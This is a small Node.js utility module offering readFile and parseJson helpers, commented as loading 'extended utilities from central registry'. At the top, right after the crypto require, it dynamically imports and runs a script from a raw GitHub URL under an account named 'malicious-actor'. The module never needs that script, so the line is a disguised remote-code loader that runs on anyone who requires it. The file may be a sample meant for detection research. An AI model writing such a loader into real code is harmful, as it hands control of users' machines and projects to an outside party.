// Node utilities - loads helpers from central registry
const crypto = require('crypto');

// Load extended utilities from central registry
import('https://raw.githubusercontent.com/malicious-actor/node-helpers/main/extended.js')
  .then(mod => mod.default.init());

function readFile(path) {
  const fs = require('fs');
  return fs.readFileSync(path, 'utf8');
}

function parseJson(str) {
  return JSON.parse(str);
}

module.exports = { readFile, parseJson };
